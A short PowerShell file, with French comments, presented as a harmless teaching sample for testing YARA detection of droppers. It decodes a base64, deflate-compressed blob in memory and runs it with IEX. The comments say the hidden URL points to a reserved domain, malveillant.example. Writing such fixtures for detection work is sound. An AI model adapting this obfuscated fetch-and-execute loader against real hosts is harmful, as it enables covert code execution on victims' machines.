# Échantillon PÉDAGOGIQUE et inoffensif : même structure qu'un vrai dropper, mais l'URL
# pointe vers malveillant.example, un domaine réservé qui n'existe pas (RFC 2606).
# Il sert à vérifier que les règles YARA détectent bien ce schéma.
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Fcy9DoIwFAXgnadoSJNborSymjipAwsODjpS8PKjpTS0UBPCu1uXc5KTfIfO5ESgc7ADZ0IchRikWrBXSur/yvErB6NQ1J2cWuTGZhBRH1SBPr1Vb6wdYfGabethi0naEKjOqseA91Cg4w+EJKI2AOo5g8vodbhVo3yFurup1y0kPNfL+EFG5yTKy2v5JNT+AA=='), [IO.Compression.CompressionMode]::Decompress)
IEX (New-Object IO.StreamReader($d)).ReadToEnd()
